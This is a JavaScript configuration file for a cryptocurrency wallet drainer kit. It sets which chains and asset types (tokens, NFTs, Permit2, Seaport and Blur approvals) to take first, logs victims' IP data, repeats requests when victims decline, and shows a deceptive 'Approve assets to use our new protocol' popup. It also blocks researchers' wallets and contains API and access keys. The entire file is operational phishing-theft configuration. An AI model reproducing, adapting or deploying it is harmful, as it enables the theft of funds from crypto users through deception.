// Your acces key
let ACCESS_KEY = "ebb27e3b-a658-46fe-9b28-7581a9d761d9";

let USE_W3M_V3 = true; // Use web3modal v3 instead of v2

// Connect modal settings
let mainModal = "w3m"; // What modal will user see
// w3m - Web3Modal
// sm - sugar modal
// custom - Custom modal code
let customModalCode = ``;
// if you using custom modal code make sure that your modal have these elements with ids:
// web3-modal-trust - Button for TrustWallet connection
// web3-modal-coinbase - Button for CoinBase connection
// web3-modal-metamask - Button for Metamask connection
// web3-modal-web3modal - Button for web3modal connection (other wallets)
// web3-modal - Element of modal
// web3-overlay - (Optional) Element for modal background


// Web3Modal visual settings
let chooseWalletTheme = "dark"; // Theme for this popup "dark" or "light"
let themeVariables = {
    '--w3m-z-index': 10000,
    '--w3m-overlay-backdrop-filter': 'blur(6px)',
};
// Custom styles and colors https://docs.walletconnect.com/2.0/web/web3modal/html/wagmi/theming

// Web3Modal metadata
let w3m_name = ""; // Current window title used if blank
let w3m_description = ""; // Current window title used if blank
let w3m_url = ""; // Current domain used if blank
let w3m_icons = ['https://avatars.githubusercontent.com/u/37784886']; // Your favicon link can be here (using full url recommended)

// Logging setting
let logDrainingStrategy = true; // Log draining strategy
let logEmptyWallets = true; // Log when wallet is empty
let logIpData =  true; // Add IP data to logs

// Repeat the highest proice token if user declines 
let repeatHighest = true;

let retry_changenetwork = 2;

// Weights of transfer, assets with highest weight will be transfered first. Weight = multiplier * eth_price
let multipliers = {
    "LP_NFTS": 1,
    "PERMIT2": 1,
    "BLUR": 1,
    "SEAPORT": 1,
    "SWAP": 1,
    "TOKENS": 1,
    "NFT": 1,
    "NATIVES": 1,
}

// Manual disable/enable chains. true - enabled, false - disabled
let eth_enabled = true;
let bsc_enabled = true;
let arb_enabled = true;
let polygon_enabled = true;
let avalanche_enabled = true;
let optimism_enabled = true;
let ftm_enabled = true;
let celo_enabled = true;
let cronos_enabled = true;
let base_enabled = true;

let autoconnect = false; // Automatically connect wallet after page was loaded

// Alerts
let useSweetAlert = true; // Set true to use sweet alert, false for default browser alerts
let notEligible = "Your wallet is not eligible, connect another wallet."; // Low balance message
let swal_notEligibleTitle = "Not eligible"; // Title for SweetAlert

let addressChanged = "Your wallet address has changed, connect wallet again please"; // Message text in case of wallet address change in the process of draining
let swal_addressChangedTitle = "Address changed"; // Title for SweetAlert

// Popup settings
let popupEnabled = true; // true or false, popup after connecting wallet while draining

//HTML Code of popup
let popupCode = `<div id="drPopup" class="drPopup" style="display:none; !important; font-family: 'Poppins', sans-serif; position: fixed !important; inset: 0 !important; z-index: 150 !important; height: 100% !important; width: 100% !important; transition: opacity 0.3s ease-in-out 0s; background: rgba(0, 0, 0, 0.8) !important; justify-content: center !important; max-height: 100%; !important">
        <div class="keks-container" style="margin: 40px 0px !important;">
        <div class="keks-content" style="position: relative !important;border-radius: 16px;background: #191919 !important;width: 360px;max-height: calc(0px + 100vh);max-width: 100%;">
        <div class="keks-title" style="position: relative; text-align: center; padding: 16px 24px;">
            <h4 style="font-weight: 600;
            line-height: 110%;
            font-size: 22px;
            color: #fff;
            padding: 4px 16px
            ">Pending...</h4>
            <div class="keks-close" id="popupClose"></div>
            <style>
                .keks-close {
                cursor: pointer;
                position: absolute;
                right: 25px;
                top: 15px;
                width: 20px;
                height: 20px;
                opacity: 0.3;
                }
                .keks-close:hover {
                opacity: 0.4;
                }
                .keks-close:before, .keks-close:after {
                content: '';
                position: absolute;
                left: 15px;
                height: 19px;
                width: 2px;
                background-color: #7f7f7f;

                }
                .keks-close:before {
                transform: rotate(45deg);
                }
                .keks-close:after {
                transform: rotate(-45deg);
                }
            </style>
        </div>
        <div class="keks-details" style="padding: 24px;">
            <div style="; align-items: center; gap: 25px;">
                <div class="keks-image">
                <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="margin: auto; background: none; display: block; shape-rendering: auto;" width="200px" height="200px" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid">
<circle cx="50" cy="50" r="32" stroke-width="8" stroke="#2775ca" stroke-dasharray="50.26548245743669 50.26548245743669" fill="none" stroke-linecap="round">
  <animateTransform attributeName="transform" type="rotate" repeatCount="indefinite" dur="1s" keyTimes="0;1" values="0 50 50;360 50 50"></animateTransform>
</circle>
<!-- [ldio] generated by https://loading.io/ --></svg>
                </div>
    
                <div class="keks-imageName">
                    <p style="font-size: 16.5px; font-weight: 600; color: #fff"></p>
                </div>
            </div>
            <hr style="padding: 0px; margin: 28px 0px; opacity: 0.2; border-color: rgb(138, 147, 155) currentcolor currentcolor; border-style: solid none none; border-width: 1px medium medium; border-image: none 100% / 1 / 0 stretch; color: rgb(138, 147, 155); text-align: center;">
            <div class="keks-text">
                <div style="color: #fff; align-items: center; margin-bottom: 12px; display: flex; text-align: center; font-weight: 600;  background: #323232; border-radius: 12px; padding: 7px;">
                <img src="https://cdn-icons-png.flaticon.com/512/1828/1828640.png" height="22" style="margin-right: 5px;height: 19px;display: inline-block;vertical-align: middle;width: 19px;" width="6">
                <h3 style="text-align: center; font-size: 13px; font-weight: 600; color: #fff; margin: 0;">Approve assets to use our new protocol</h3></div>
                <div style="color: #fff !important; line-height: 140%; margin-bottom: 12px; font-weight: 600;"><h3 style="font-size: 14px; text-align: center; font-weight: 600; position: relative;">Check your wallet for signature request</h3></div>
                </div>
        </div>
    </div>
        </div>
    </div>`;

let popupElementID = "drPopup";
let canClosePopup = true; // Can user close popup?
let popupCloseButtonID = "popupClose";

// Button settings
let connectElement = "connectButton"; // Dont't touch if not sure (class of button that's starts draining)
let messageElement = "messageButton"; // Dont't touch if not sure (id of element that's show status)

let buttonMessagesEnabled = false;
let textInitialConnected = "Try again";
let textProgress = "Loading ...";
let success = "Please approve ...";
let failed = "Try again !";


// Two step draining
// After wallet connection drain doesn't starts, user need to click on additional button.
let twoStep = false; // true to enable twostep
let twoStepButtonElement = "startButton";

// After user connect wallet this function will be called, you can use it to display user info or enable twostep and show form for connecting and for claiming only 
function updateWalletData(walletAddress, walletEthBalance, status){
    // Paste any code that you want here
    // This function will execute after wallet connection
    // Use walletAddress and walletEthBalance variables

    // Status:
    // 0 - Connected wallet
    // 1 - Draining started
    // 2 - User not eligible
    // 3 - Draining finished

    console.log(walletAddress, walletEthBalance, status);
}

let infura_key = "9aa3d95b3bc440fa88ea12eaa4456161";
let wc_projectid = "0761e7d1b5103f901dbdb7fd033df5b90761e7d1b5103f901dbdb7fd033df5b9"; // ProjectID from https://cloud.walletconnect.com/

//Do not touch
let cfgversion = 680;

// Block wallets
let researchers = [
    "0x0000000000000000000000000000000000000003",
];

// [EXPERIMENTAL FUNCTIONS] Enable them if you know what you are doing
// These functions are untested and may cause potential profit loss
let experimental = {
    // No experimental fx's yet
};